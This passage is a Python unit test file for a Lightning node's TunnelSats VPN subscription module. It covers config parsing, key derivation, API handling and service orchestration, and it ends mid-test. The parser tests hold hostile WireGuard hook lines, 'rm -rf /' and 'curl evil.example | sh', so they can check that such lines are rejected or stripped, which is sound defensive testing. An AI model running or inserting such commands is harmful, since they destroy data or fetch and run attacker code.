#!/usr/bin/python3
"""Unit tests for blitz.subscriptions.tunnelsats.py (stdlib only, no network).

The module is imported and its real functions run with injected http, run, clock and filesystem
root. Commands (internet.tunnelsats.sh, systemctl, blitz.conf.sh, ...) are recorded by a fake that
answers with real documents from fixtures/; one test routes the guard to the real bash functions.
Run: python3 -m unittest discover -s test/tunnelsats
"""

import base64
import binascii
import datetime
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
FIXTURES = os.path.join(HERE, "fixtures")
MODULE_PATH = os.path.join(REPO, "home.admin", "config.scripts", "blitz.subscriptions.tunnelsats.py")
ITS_PATH = os.path.join(REPO, "home.admin", "config.scripts", "internet.tunnelsats.sh")

_spec = importlib.util.spec_from_file_location("tunnelsats_module", MODULE_PATH)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)
sys.path.insert(0, HERE)
import schema_check  # noqa: E402

ALICE_PRIV = "dwdtCnMYpX08FsFyUbJmRd9ML4frwJkqsXf7pR25LCo="
ALICE_PUB = "hSDwCYkwp1R0i33ctD73Wg2/Og0mOBr066SpjqqbTmo="
BOB_PUB = "3p7bfXt9wbTTW2HC7OQ1Nz+DQ8hbeGdNrfx+FG+IK08="
INVOCATION = "0123456789abcdef0123456789abcdef"
NOW = datetime.datetime(2026, 10, 14, 12, 0, 0, tzinfo=datetime.timezone.utc)
LND_FLAGS = ["--tor.skip-proxy-for-clearnet-targets", "--externalhosts=de2.tunnelsats.com:24556"]
with open(os.path.join(HERE, "schema", "module-envelope.schema.json")) as _handle:
    ENVELOPE = json.load(_handle)


def fixture(*parts, mode="r"):
    with open(os.path.join(FIXTURES, *parts), mode) as handle:
        return handle.read()


def fixture_json(*parts):
    return json.loads(fixture(*parts))


def make_bolt11(hrp="lnbc2500u", payment_hash="a" * 64, timestamp=None, expiry=None):
    ts = int(NOW.timestamp()) if timestamp is None else int(timestamp)
    data = [(ts >> (5 * (6 - i))) & 31 for i in range(7)]
    if payment_hash is not None:
        h_int = int(payment_hash, 16) << 4
        p_words = [(h_int >> (5 * (51 - i))) & 31 for i in range(52)]
        data += [1, (52 >> 5) & 31, 52 & 31] + p_words
    if expiry is not None:
        data += [6, 0, 3, (expiry >> 10) & 31, (expiry >> 5) & 31, expiry & 31]
    data += [(i * 7 + 3) & 31 for i in range(104)]
    values = mod._bech32_hrp_expand(hrp.lower()) + data + [0, 0, 0, 0, 0, 0]
    polymod = mod._bech32_polymod(values) ^ 1
    checksum = [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
    return hrp + "1" + "".join(mod._BECH32_CHARSET[d] for d in data + checksum)


class FakeSystem:
    """Records every command and answers with scripted results; HTTP likewise."""

    def __init__(self, root):
        self.root = root
        self.calls = []
        self.timeouts = []
        self.http_calls = []
        self.http_responses = []
        self.sleeps = []
        self.notify_rc = 0
        self.qrencode_rc = 0
        self.wg_genkey = ALICE_PRIV
        self.wg_genkey_rc = 0
        self.real_guard = False
        # systemctl start, stop, enable and disable change the unit state below, as on a node
        self.stateful = True
        self.getent = {}
        self.announce_rc = 0
        # callables run with every command before it is answered; (verb, unit) -> rc of a failing
        # systemctl; (verb, unit) of a systemctl that answers 0 but changes nothing
        self.hooks = []
        self.systemctl_rc = {}
        self.systemctl_noop = set()
        # unit -> [reads, final]: a unit that is starting (Type=notify) reads back "activating" for that
        # many ActiveState reads, then final; systemctl start or restart joins that start
        self.starting = {}
        self.its = {
            "audit lnd": (0, {"status": "clean", "eligible": True, "keys": [], "reason": None,
                              "not_eligible_reason": None}),
            "audit cl": (1, {"status": "unrepairable", "reason": "config_missing", "eligible": True, "keys": []}),
            "audit lnd --repair": (0, {"status": "clean", "keys": []}),
            "audit cl --repair": (0, {"status": "clean", "keys": []}),
            "detect": (0, fixture_json("tool", "detect_none.json")),
            "fetch": (0, {"contract": 1, "command": "its.fetch", "ok": True, "exit_code": 0, "errors": []}),
            "block-insert --check": (0, {"state": "absent", "changed": False}),
            "block-insert": (0, {"state": "present", "changed": True}),
            "block-remove": (0, {"state": "absent", "changed": True}),
            "block-status": (0, {"state": "present"}),
            "install": (0, fixture_json("tool", "install_ok.json")),
            "adopt": (0, dict(fixture_json("tool", "install_ok.json"), adopted=True)),
            "uninstall": (0, fixture_json("tool", "uninstall_disabled.json")),
            "verify --no-probe": (5, fixture_json("verify", "activating_tunnel_up.json")),
            "verify": (0, fixture_json("verify", "protected.json")),
            "status": (0, {"tool_hash": "current", "dev_override": "no"}),
            "guard": (0, {"decision": "hybrid", "reason": "ok"}),
            "tick-timer on": (0, "active"),
            "tick-timer off": (0, "absent"),
            "tick-timer status": (0, "absent"),
        }
        self.units = {
            "lnd.service": {"ActiveState": "active", "InvocationID": INVOCATION, "MainPID": "4242",
                            "ControlGroup": "/tunnelsats.slice/lnd.service", "UnitFileState": "enabled",
                            "FragmentPath": "/etc/systemd/system/lnd.service", "NeedDaemonReload": "no"},
            "lightningd.service": {"ActiveState": "inactive", "InvocationID": "", "MainPID": "0", "ControlGroup": "",
                                   "UnitFileState": "disabled",
                                   "FragmentPath": "/etc/systemd/system/lightningd.service", "NeedDaemonReload": "no"},
        }
        # LND resolves externalhosts and announces the resolved address (1.2.3.4 = endpoint.ipv4)
        self.getinfo = {"uris": ["0280a@1.2.3.4:24556", "0280a@exampleonion.onion:9735"]}
        self.lnd_listpayments = (0, {"payments": []})
        self.lnd_decodepayreq = None
        self.lnd_payinvoice = (1, {}, "unable to find a path to destination")
        self.cln_listpays = (0, {"pays": []})
        self.cln_decode = None
        self.cln_pay = (1, {"code": 205, "message": "Could not find a route"}, "")
        self.wg = {"latest-handshakes": "%s\t%d\n" % (BOB_PUB, int(NOW.timestamp()) - 30),
                   "transfer": "%s\t1000\t2000\n" % BOB_PUB}

    # -- commands ---------------------------------------------------------------------------
    def its_key(self, args):
        tokens = [a for a in args if a != "--json"]
        if tokens and tokens[0] in ("install", "adopt", "guard"):
            return tokens[0]
        return " ".join(tokens)

    def _pop_scripted(self, attr_name):
        val = getattr(self, attr_name)
        if isinstance(val, list):
            val = val.pop(0) if len(val) > 1 else val[0]
        if callable(val):
            val = val()
        rc, doc = val[0], val[1]
        err = val[2] if len(val) > 2 else ""
        out = doc if isinstance(doc, str) else json.dumps(doc)
        return rc, out, err

    def run(self, argv, timeout=60, interactive=False):
        self.calls.append(list(argv))
        self.timeouts.append((list(argv), timeout))
        for hook in self.hooks:
            hook(list(argv))
        prog = argv[0]
        if prog == mod.BLITZ_CONF and argv[1] == "set":
            self.conf_set(argv[2], argv[3])
            return 0, "", ""
        if prog == mod.ITS:
            if self.real_guard and argv[1] == "guard":
                return self.run_real_guard(argv[2:])
            key = self.its_key(argv[1:])
            answer = self.its.get(key, (127, ""))
            if isinstance(answer, list):
                answer = answer.pop(0) if len(answer) > 1 else answer[0]
            if callable(answer):
                answer = answer()
            rc, doc = answer
            if key == "uninstall" and isinstance(doc, dict) and isinstance(doc.get("remaining"), list) \
                    and doc.get("unit") in self.units:
                # the tool leaves the unit as its report says
                self.units[doc["unit"]]["ActiveState"] = "active" if doc.get("ln_started") else "inactive"
                if doc.get("ln_disabled"):
                    self.units[doc["unit"]]["UnitFileState"] = "disabled"
            return rc, doc if isinstance(doc, str) else json.dumps(doc), ""
        if prog == "systemctl":
            if argv[1] == "show":
                unit = argv[-1]
                props = [argv[i + 1] for i in range(len(argv)) if argv[i] == "-p"]
                if unit in self.starting and "ActiveState" in props:
                    if self.starting[unit][0] > 0:
                        self.starting[unit][0] -= 1
                        self.units[unit]["ActiveState"] = "activating"
                    else:
                        self.units[unit]["ActiveState"] = self.starting.pop(unit)[1]
                values = self.units.get(unit, {})
                return 0, "".join("%s=%s\n" % (p, values.get(p, "")) for p in props), ""
            if self.systemctl_rc.get((argv[1], argv[-1])):
                return self.systemctl_rc[(argv[1], argv[-1])], "", "Job for %s failed." % argv[-1]
            if argv[1] in ("start", "restart") and argv[-1] in self.starting:
                return 0, "", ""
            if self.stateful and argv[-1] in self.units and (argv[1], argv[-1]) not in self.systemctl_noop:
                state = {"start": ("ActiveState", "active"), "restart": ("ActiveState", "active"),
                         "stop": ("ActiveState", "inactive"), "enable": ("UnitFileState", "enabled"),
                         "disable": ("UnitFileState", "disabled")}.get(argv[1])
                if state:
                    self.units[argv[-1]][state[0]] = state[1]
            return 0, "", ""
        if prog == "getent":
            return self.getent.get(argv[-1], (2, "")) + ("",)
        if prog == "install":
            shutil.copy(os.path.join(REPO, "home.admin", "assets", "lnd.service"),
                        os.path.join(self.root, argv[-1].lstrip("/")))
            return 0, "", ""
        if prog == "wg":
            if len(argv) >= 2 and argv[1] == "genkey":
                return self.wg_genkey_rc, (self.wg_genkey + "\n" if self.wg_genkey_rc == 0 else ""), ""
            return 0, self.wg.get(argv[3], ""), ""
        if prog == "qrencode":
            if self.qrencode_rc != 0:
                return self.qrencode_rc, "", "qrencode failed"
            if "-o" in argv:
                out_path = argv[argv.index("-o") + 1]
                if not out_path.startswith(self.root):
                    out_path = os.path.join(self.root, out_path.lstrip("/"))
                os.makedirs(os.path.dirname(out_path), exist_ok=True)
                with open(out_path, "wb") as handle:
                    handle.write(b"\x89PNG\r\n\x1a\nFAKEQR")
                return 0, "", ""
            return 0, "FAKE_ANSI_QR\n", ""
        if prog == mod.BLITZ_DISPLAY:
            return 0, "", ""
        if prog == "sudo":
            if "updatenodeannouncement" in argv:
                if self.announce_rc == 0 and self.getinfo is not None:
                    gone = argv[argv.index("--address_remove") + 1]
                    self.getinfo["uris"] = [u for u in self.getinfo["uris"] if not u.endswith("@" + gone)]
                return self.announce_rc, "{}" if self.announce_rc == 0 else "", "" if self.announce_rc == 0 else "rpc error"
            if "listpayments" in argv:
                return self._pop_scripted("lnd_listpayments")
            if "decodepayreq" in argv:
                if self.lnd_decodepayreq is not None:
                    return self._pop_scripted("lnd_decodepayreq")
                inv_dec = mod.decode_bolt11(argv[-1])
                return 0, json.dumps({"payment_hash": inv_dec["payment_hash"], "num_satoshis": str(inv_dec["amount_sats"])}), ""
            if "payinvoice" in argv:
                return self._pop_scripted("lnd_payinvoice")
            if "listpays" in argv:
                return self._pop_scripted("cln_listpays")
            if "decode" in argv:
                if self.cln_decode is not None:
                    return self._pop_scripted("cln_decode")
                inv_dec = mod.decode_bolt11(argv[-1])
                return 0, json.dumps({"payment_hash": inv_dec["payment_hash"], "amount_msat": "%dmsat" % (inv_dec["amount_sats"] * 1000)}), ""
            if "pay" in argv and "-k" in argv:
                return self._pop_scripted("cln_pay")
            return (0, json.dumps(self.getinfo), "") if self.getinfo is not None else (1, "", "locked")
        if prog == mod.NOTIFY:
            return self.notify_rc, "", ""
        if prog == mod.CL_INSTALL_SERVICE:
            return 0, "", ""
        return 127, "", "unexpected"

    def run_real_guard(self, args):
        """The real start guard functions of internet.tunnelsats.sh against this fixture tree."""
        root = self.root
        tool = os.path.join(root, "tool.sh")
        with open(tool, "w") as handle:
            handle.write("#!/bin/bash\ncat '%s'\nexit 0\n" % os.path.join(FIXTURES, "verify", "protected.json"))
        os.chmod(tool, 0o755)
        script = (
            'source "$ITS"; TS_RB_CONF="$R/mnt/hdd/app-data/raspiblitz.conf"; TS_RB_APPDATA="$R/mnt/hdd/app-data"; '
            'TS_RB_RUN_DIR="$R/run/tunnelsats"; TS_RB_TOOL="$R/tool.sh"; TS_RB_ROOT_UID="$(id -u)"; '
            'TS_RB_CLN_DIR="$R/cln"; TS_RB_BOOT_ID="$R/boot_id"; '
            'TS_ACCEPTED_SHA256=("$(sha256sum "$TS_RB_TOOL" | cut -d" " -f1)"); its_cmd_guard "$@"')
        env = dict(os.environ, ITS=ITS_PATH, R=root, LC_ALL="C")
        proc = subprocess.run(["bash", "-c", script, "_"] + list(args), capture_output=True, text=True,
                              env=env, timeout=60, check=False)
        return proc.returncode, proc.stdout, proc.stderr

    def conf_set(self, key, value):
        path = os.path.join(self.root, mod.RB_CONF.lstrip("/"))
        with open(path) as handle:
            lines = [line for line in handle.read().splitlines() if not line.startswith(key + "=")]
        lines.append("%s=%s" % (key, value))
        with open(path, "w") as handle:
            handle.write("\n".join(lines) + "\n")

    def calls_of(self, prog, *prefix):
        return [c for c in self.calls if c[0] == prog and c[1:1 + len(prefix)] == list(prefix)]

    def index_of(self, prog, *prefix):
        for i, call in enumerate(self.calls):
            if call[0] == prog and call[1:1 + len(prefix)] == list(prefix):
                return i
        return -1

    # -- http -------------------------------------------------------------------------------
    def http(self, url, payload=None):
        self.http_calls.append((url, payload))
        answer = self.http_responses.pop(0) if self.http_responses else (200, {}, fixture("api", "status_enabled.json").encode())
        if isinstance(answer, Exception):
            raise answer
        return answer

    def sleep(self, seconds):
        self.sleeps.append(seconds)


class ModuleTestCase(unittest.TestCase):
    def setUp(self):
        self.old_umask = os.umask(0o022)
        self.root = tempfile.mkdtemp(prefix="ts-module-")
        for d in ("mnt/hdd/app-data/lnd", "run/tunnelsats", "etc/systemd/system", "etc/wireguard", "proc/4242",
                  "cln"):
            os.makedirs(os.path.join(self.root, d), exist_ok=True)
        self.write("mnt/hdd/app-data/raspiblitz.conf",
                   "lightning=lnd\nlnd=on\nchain=main\nrunBehindTor=on\nnotify=off\n")
        shutil.copy(os.path.join(REPO, "home.admin", "assets", "lnd.service"),
                    os.path.join(self.root, "etc/systemd/system/lnd.service"))
        shutil.copy(os.path.join(FIXTURES, "conf", "lnd.conf"), os.path.join(self.root, "mnt/hdd/app-data/lnd/lnd.conf"))
        self.write("boot_id", "0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0\n")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"] + LND_FLAGS)
        self.fake = FakeSystem(self.root)
        self.logs = []
        self.deps = mod.Deps(root=self.root, http=self.fake.http, run=self.fake.run, clock=lambda: NOW,
                             sleep=self.fake.sleep, is_root=lambda: True, log=self.logs.append)
        self.import_file = os.path.join(FIXTURES, "import", "website.conf")

    def tearDown(self):
        os.umask(self.old_umask)
        shutil.rmtree(self.root, ignore_errors=True)

    # -- helpers ----------------------------------------------------------------------------
    def write(self, rel, text):
        path = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as handle:
            handle.write(text)
        return path

    def cmdline(self, pid, args, ppid=1, comm=None):
        self.write("proc/%d/cmdline" % pid, "\0".join(args) + "\0")
        self.write("proc/%d/stat" % pid, "%d (%s) S %d 0 0\n" % (pid, comm or os.path.basename(args[0]), ppid))

    def record(self, decision="hybrid", reason="ok", invocation=INVOCATION, base="lnd", ipv4=None):
        doc = {"schema": "raspiblitz.tunnelsats.guard/1", "unit": base + ".service", "impl": "lnd",
               "chain": "mainnet", "decision": decision, "reason": reason, "detail": "",
               "invocation_id": invocation, "decided_at": "2026-10-14T11:00:00Z",
               "announce": {"host": "de2.tunnelsats.com", "ipv4": ipv4, "port": 24556}}
        self.write("run/tunnelsats/guard-%s.json" % base, json.dumps(doc))

    def store(self, mode="managed", impl="lnd", **extra):
        cfg = mod.parse_wg_config(fixture("import", "website.conf", mode="rb"))
        data = mod.validate_status(fixture_json("api", "status_enabled.json"))
        return mod.store_subscription(self.deps, cfg, mode, impl, "confirmed", data, extra or None)

    def activate_conf(self, impl="lnd"):
        self.fake.conf_set("tunnelsats", "on")
        self.fake.conf_set("tunnelsatsImpl", impl)

    def lose_the_report(self, still_managed=False):
        """uninstall --managed does its work (stops and disables LND, removes /run/tunnelsats and,
        unless still_managed, the dataplane) but its report does not arrive: E_TOOL_OUTPUT, as on
        the VM when the private copy ran below /run/tunnelsats (QA round 4c)."""
        fake = self.fake
        fake.stateful = True

        def uninstall():
            fake.units["lnd.service"].update({"ActiveState": "inactive", "UnitFileState": "disabled"})
            shutil.rmtree(self.path("run/tunnelsats"), ignore_errors=True)
            return 1, {"contract": 1, "command": "uninstall", "ok": False, "exit_code": 1, "errors": [
                {"code": "E_TOOL_OUTPUT", "class": "operational",
                 "message": "tunnelsats.sh uninstall printed no single JSON document (exit 0)"}]}
        fake.its["uninstall"] = uninstall
        if still_managed:
            fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))

    def starts_after_install(self, reads, final="active", unit="lnd.service"):
        """The tool's install --managed restarts unit, which stays activating (LND until it is ready,
        Type=notify) for that many reads of its ActiveState, then reads back final."""
        def hook(argv):
            if argv[:2] in ([mod.ITS, "install"], [mod.ITS, "adopt"]):
                self.fake.units[unit]["ActiveState"] = "activating"
                self.fake.starting[unit] = [reads, final]
        self.fake.hooks.append(hook)

    def start_steps(self):
        return [s for s in self.fake.sleeps if s == mod.LN_START_STEP]

    def run_verb(self, *argv):
        out = io.StringIO()
        rc = mod.main(list(argv) + ["--json"], deps=self.deps, out=out)
        doc = json.loads(out.getvalue())
        self.assertEqual([], schema_check.validate(doc, ENVELOPE), doc)
        self.assertEqual(rc, doc["exit_code"])
        self.assertNotIn(ALICE_PRIV, out.getvalue())
        self.assertFalse(any(ALICE_PRIV in line for line in self.logs))
        self.assertFalse(any(ALICE_PRIV in " ".join(call) for call in self.fake.calls))
        self.docs = getattr(self, "docs", []) + [doc]
        return doc

    def path(self, rel):
        return os.path.join(self.root, rel.lstrip("/"))

    def read_json(self, rel):
        with open(self.path(rel)) as handle:
            return json.load(handle)

    def read_bytes(self, rel):
        with open(self.path(rel), "rb") as handle:
            return handle.read()


# ------------------------------------------------------------------------------------------
# Parser and validator
# ------------------------------------------------------------------------------------------

class TestParser(unittest.TestCase):
    def test_website_config_rebuilt_byte_exact(self):
        cfg = mod.parse_wg_config(fixture("import", "website.conf", mode="rb"))
        self.assertEqual(ALICE_PUB, cfg["public_key"])
        self.assertTrue(cfg["public_key_matches"])
        self.assertEqual(24556, cfg["vpn_port"])
        self.assertEqual("de2.tunnelsats.com", cfg["endpoint_host"])
        self.assertTrue(any("DNS" in w for w in cfg["warnings"]))
        self.assertEqual(fixture("import", "website.golden.conf", mode="rb"), mod.render_wg_config(cfg))

    def test_old_format_config(self):
        cfg = mod.parse_wg_config(fixture("import", "old-format.conf", mode="rb"))
        self.assertEqual(31337, cfg["vpn_port"])
        self.assertIsNone(cfg["public_key_matches"])
        self.assertTrue(any("IPv6" in w for w in cfg["warnings"]))
        self.assertTrue(any("PostUp" in w for w in cfg["warnings"]))
        rebuilt = mod.render_wg_config(cfg)
        self.assertEqual(fixture("import", "old-format.golden.conf", mode="rb"), rebuilt)
        self.assertNotIn(b"PostUp", rebuilt)

    def test_crlf_is_accepted_and_written_as_lf(self):
        data = fixture("import", "website.conf", mode="rb").replace(b"\n", b"\r\n")
        cfg = mod.parse_wg_config(data)
        self.assertNotIn(b"\r", mod.render_wg_config(cfg))

    def hostile(self, transform, code):
        data = transform(fixture("import", "website.conf"))
        if isinstance(data, str):
            data = data.encode()
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.parse_wg_config(data)
        self.assertEqual(code, ctx.exception.code, ctx.exception.message)
        for secret in (ALICE_PRIV, "evil.example", "203.0.113.9", "rm -rf"):
            self.assertNotIn(secret, ctx.exception.message)
        return ctx.exception

    def test_hostile_inputs(self):
        cases = [
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/32\rPostUp = rm -rf /"), "E_CONFIG_INVALID"),
            (lambda t: t.replace(ALICE_PRIV, ALICE_PRIV[:-2] + "Z="), "E_CONFIG_INVALID"),
            (lambda t: t.replace(ALICE_PRIV, "!" + ALICE_PRIV[1:]), "E_CONFIG_INVALID"),
            (lambda t: t + "[Peer]\nPublicKey = %s\n" % BOB_PUB, "E_CONFIG_INVALID"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "203.0.113.9:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "[2001:db8::1]:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "vpn.evil.example:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "tunnelsats.com.evil.example:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("# Port Forwarding: 24556\n", ""), "E_CONFIG_NO_PORT"),
            (lambda t: t.replace("# Port Forwarding: 24556", "# Port Forwarding: 70000"), "E_CONFIG_NO_PORT"),
            (lambda t: t.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.0.0.0/8"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 192.168.1.5/24"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = fd00::5/64"), "E_CONFIG_INVALID"),
            (lambda t: t.encode() + b"\x00", "E_CONFIG_INVALID"),
            (lambda t: t + "#" + "x" * 17000 + "\n", "E_CONFIG_INVALID"),
            (lambda t: t.replace("DNS = 8.8.8.8", "Address = 10.9.0.43/32"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("[Peer]", "[Peer]\n[Other]"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("PrivateKey = %s\n" % ALICE_PRIV, ""), "E_CONFIG_INVALID"),
            (lambda t: "Endpoint = de2.tunnelsats.com:1\n" + t, "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address", "Address\x1b[31m"), "E_CONFIG_INVALID"),
            (lambda t: t.encode().replace(b"Address", b"Addr\xffess"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("PersistentKeepalive = 25", "PersistentKeepalive = 99999"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.0.0.1/1"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/24"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/32, 10.9.0.43/31"), "E_CONFIG_INVALID"),
        ]
        for transform, code in cases:
            with self.subTest(code=code):
                self.hostile(transform, code)

    def test_a_bare_address_counts_as_a_single_host(self):
        cfg = mod.parse_wg_config(fixture("import", "website.conf").replace(
            "Address = 10.9.0.42/32", "Address = 10.9.0.42").encode())
        self.assertEqual(["10.9.0.42/32"], cfg["addresses"])

    def test_validators_reject_a_trailing_newline(self):
        self.assertTrue(mod.valid_host("de2.tunnelsats.com"))
        self.assertFalse(mod.valid_host("de2.tunnelsats.com\n"))
        status = fixture_json("api", "status_enabled.json")
        self.assertIsNotNone(mod.validate_status(status))
        status["server_domain"] += "\n"
        self.assertIsNone(mod.validate_status(status))
        self.assertIsNone(mod.parse_iso("2026-10-14T12:00:00Z\n"))
        self.assertIsNone(mod.KEY_RE.fullmatch(ALICE_PRIV + "\n"))
        self.assertEqual("E_FALLBACK", mod.tool_error({"errors": [{"code": "E_TIMEOUT\n"}]}, "E_FALLBACK"))
        self.assertIsNone(mod._api_error_code(b'{"error": "ERR_RATE_LIMIT\\n"}'))
        self.assertFalse(mod.has_flags("lnd", ["--tor.skip-proxy-for-clearnet-targetsX"]))
        self.assertTrue(mod.has_flags("lnd", ["--externalhosts=de2.tunnelsats.com:24556"]))

    def test_hooks_and_dns_are_dropped_with_warnings_never_copied(self):
        text = fixture("import", "website.conf").replace(
            "DNS = 8.8.8.8", "DNS = 8.8.8.8\nPostUp = curl evil.example | sh\nPreDown = x\nTable = off\nFwMark = 0x1\n"
                             "SaveConfig = true\nListenPort = 51820\nMysteryKey = 1")
        cfg = mod.parse_wg_config(text.encode())
        rebuilt = mod.render_wg_config(cfg).decode()
        for word in ("PostUp", "PreDown", "Table", "FwMark", "SaveConfig", "ListenPort", "MysteryKey", "DNS", "evil"):
            self.assertNotIn(word, rebuilt)
        self.assertEqual(8, len(cfg["warnings"]))
        self.assertFalse(any("evil" in w for w in cfg["warnings"]))

    def test_mypubkey_mismatch_uses_the_derived_key(self):
        text = fixture("import", "website.conf").replace("# myPubKey: " + ALICE_PUB, "# myPubKey: " + BOB_PUB)
        cfg = mod.parse_wg_config(text.encode())
        self.assertFalse(cfg["public_key_matches"])
        self.assertEqual(ALICE_PUB, cfg["public_key"])


# ------------------------------------------------------------------------------------------
# X25519
# ------------------------------------------------------------------------------------------

class TestX25519(unittest.TestCase):
    def test_rfc7748_section_5_2_vectors(self):
        vectors = [
            ("a546e36bf0527c9d3b16154b82465edd62144c0ac1fc5a18506a2244ba449ac4",
             "e6db6867583030db3594c1a424b15f7c726624ec26b3353b10a903a6d0ab1c4c",
             "c3da55379de9c6908e94ea4df28d084f32eccf03491c71f754b4075577a28552"),
            ("4b66e9d4d1b4673c5ad22691957d6af5c11b6421e0ea01d42ca4169e7918ba0d",
             "e5210f12786811d3f4b7959d0538ae2c31dbe7106fc03c3efc4cd549c715a493",
             "95cbde9476e8907d7aade45cb4b873f88b595a68799fa152e6f8f7647aac7957"),
        ]
        for k, u, out in vectors:
            self.assertEqual(out, binascii.hexlify(mod.x25519(binascii.unhexlify(k), binascii.unhexlify(u))).decode())

    def test_rfc7748_section_6_1_key_pairs_and_shared_secret(self):
        alice = binascii.unhexlify("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a")
        bob = binascii.unhexlify("5dab087e624a8a4b79e17f8b83800ee66f3bb1292618b6fd1c2f8b27ff88e0eb")
        base = (9).to_bytes(32, "little")
        alice_pub = mod.x25519(alice, base)
        bob_pub = mod.x25519(bob, base)
        self.assertEqual("8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a", alice_pub.hex())
        self.assertEqual("de9edb7d7b7dc1b4d35b61c2ece435373f8343c85b78674dadfc7e146f882b4f", bob_pub.hex())
        shared = "4a5d9d5ba4ce2de1728e3bf480350f25e07e21c947d19e3376f09b3c1e161742"
        self.assertEqual(shared, mod.x25519(alice, bob_pub).hex())
        self.assertEqual(shared, mod.x25519(bob, alice_pub).hex())
        self.assertEqual(ALICE_PUB, mod.public_key_of(ALICE_PRIV))

    def test_wg_pubkey_pair(self):
        # generated with: wg genkey | tee priv | wg pubkey (a throwaway key, no subscription)
        self.assertEqual("kBqT3q5CUU8M6X1zEzqerXWWyW/UDZDDez7mGT6leF8=",
                         mod.public_key_of("4Ll6wDUceJ98qxImrs3HduHQu0bNxERCWnImQhhWCWs="))


# ------------------------------------------------------------------------------------------
# API client
# ------------------------------------------------------------------------------------------

class TestApi(ModuleTestCase):
    def ask(self, *responses):
        self.fake.http_responses = list(responses)
        return mod.api_status(self.deps, ALICE_PUB)

    def body(self, name):
        return fixture("api", name).encode()

    def test_outcomes(self):
        outcome, data, _ = self.ask((200, {}, self.body("status_enabled.json")))
        self.assertEqual("confirmed", outcome)
        self.assertEqual({"expiry": "2026-12-01T00:00:00.000Z", "bandwidth_used_gb": 12.34, "bandwidth_limit_gb": 100,
                          "resets_this_month": 0, "max_resets_per_month": 2, "peer_status": "enabled",
                          "server_domain": "de2.tunnelsats.com", "vpn_port": 24556,
                          "last_synced_at": "2026-10-14T11:00:00.000Z"}, data)
        self.assertEqual("disabled", self.ask((200, {}, self.body("status_disabled.json")))[1]["peer_status"])
        self.assertIsNone(self.ask((200, {}, self.body("status_port_null.json")))[1]["vpn_port"])
        self.assertEqual("unknown_key", self.ask((404, {}, self.body("error_not_found.json")))[0])
        self.assertEqual("failed", self.ask((404, {}, b"<html>not found</html>"))[0])
        self.assertEqual("migration", self.ask((403, {}, self.body("error_migration.json")))[0])
        self.assertEqual("failed", self.ask((429, {"retry-after": "42"}, self.body("error_rate_limit.json")))[0])
        self.assertEqual("failed", self.ask((500, {}, self.body("error_internal.json")))[0])
        self.assertEqual("failed", self.ask(OSError("timed out"))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"{not json"))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"x" * 70000))[0])
        self.assertEqual("invalid", self.ask((400, {}, b'{"error":"ERR_INVALID_INPUT","message":"x"}'))[0])
        self.assertEqual(API_URL, self.fake.http_calls[0][0])
        self.assertEqual({"wgPublicKey": ALICE_PUB}, self.fake.http_calls[0][1])

    def test_503_retries_once_after_retry_after(self):
        outcome, _data, _ = self.ask((503, {"retry-after": "7"}, self.body("error_unavailable.json")),
                                     (200, {}, self.body("status_enabled.json")))
        self.assertEqual("confirmed", outcome)
        self.assertEqual([7], self.fake.sleeps)
        outcome, _data, _ = self.ask((503, {"retry-after": "500"}, b"{}"), (503, {}, b"{}"))
        self.assertEqual("failed", outcome)
        self.assertEqual([7, 60], self.fake.sleeps)

    def test_schema_violations_are_invalid(self):
        good = fixture_json("api", "status_enabled.json")
        edits = [("expiry", "tomorrow"), ("bandwidth_used_gb", -1), ("bandwidth_used_gb", "12"),
                 ("bandwidth_limit_gb", True), ("bandwidth_resets_this_month", 1.5), ("max_resets_per_month", -2),
                 ("status", "active"), ("server_domain", "evil.example"), ("server_domain", "x.tunnelsats.com.evil"),
                 ("vpn_port", 0), ("vpn_port", 70000), ("vpn_port", "24556"), ("last_synced_at", 5)]
        for key, value in edits:
            with self.subTest(key=key, value=value):
                bad = dict(good, **{key: value})
                self.assertEqual("invalid", self.ask((200, {}, json.dumps(bad).encode()))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"[]"))[0])

    def test_bodies_are_never_logged(self):
        self.ask((200, {}, b'{"first-marker": 1}'))
        self.ask((500, {}, b'{"error":"ERR_INTERNAL_ERROR","message":"body-marker"}'))
        self.assertFalse(any("marker" in line for line in self.logs))

    def test_the_lock_holds_while_the_tool_clears_its_run_directory(self):
        # uninstall --managed (and a failed install's rollback) removes /run/tunnelsats while REMOVE
